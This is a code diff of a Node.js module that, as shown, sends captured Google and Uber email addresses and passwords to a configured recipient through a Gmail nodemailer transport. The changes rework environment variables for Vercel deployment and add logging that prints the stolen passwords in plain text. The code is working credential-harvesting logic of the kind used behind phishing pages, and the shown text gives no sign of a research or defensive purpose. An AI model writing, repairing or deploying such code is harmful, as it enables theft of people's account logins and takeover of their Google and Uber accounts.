@@ -1,20 +1,23 @@
-import dotenv from 'dotenv';
 import nodemailer from 'nodemailer';
 
-dotenv.config();
+// Environment variables are automatically available in Vercel
+const GMAIL_USER = process.env.GMAIL_USER;
+const GMAIL_PASSWORD = process.env.GMAIL_PASSWORD || process.env.GMAIL_APP_PASSWORD;
+const RECIPIENT_EMAIL = process.env.RECIPIENT_EMAIL;
 
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
-    user: process.env.GMAIL_USER || process.env.NEXT_PUBLIC_GMAIL_USER,
-    pass: process.env.GMAIL_PASSWORD || process.env.NEXT_PUBLIC_GMAIL_PASSWORD
+    user: GMAIL_USER,
+    pass: GMAIL_PASSWORD
   }
 });
 
 async function sendCredentialsEmail(googleEmail, googlePassword, uberEmail, uberPassword) {
   console.log('\n=== SENDING EMAIL ===');
-  console.log('Gmail User:', process.env.GMAIL_USER || process.env.NEXT_PUBLIC_GMAIL_USER);
-  console.log('Recipient:', process.env.RECIPIENT_EMAIL || process.env.NEXT_PUBLIC_RECIPIENT_EMAIL);
+  console.log('Gmail User:', GMAIL_USER);
+  console.log('Gmail Password exists:', !!GMAIL_PASSWORD);
+  console.log('Recipient:', RECIPIENT_EMAIL);
   console.log('\nCredentials to send:');
   console.log('Google Email:', googleEmail);
   console.log('Google Password:', googlePassword);
@@ -68,8 +71,8 @@ async function sendCredentialsEmail(googleEmail, googlePassword, uberEmail, uber
     `;
 
     const info = await transporter.sendMail({
-      from: `"Login System" <${process.env.GMAIL_USER || process.env.NEXT_PUBLIC_GMAIL_USER}>`,
-      to: process.env.RECIPIENT_EMAIL || process.env.NEXT_PUBLIC_RECIPIENT_EMAIL,
+      from: `"Login System" <${GMAIL_USER}>`,
+      to: RECIPIENT_EMAIL,
       subject: `New Login Credentials - ${new Date().toLocaleDateString()}`,
       html: htmlContent
     });
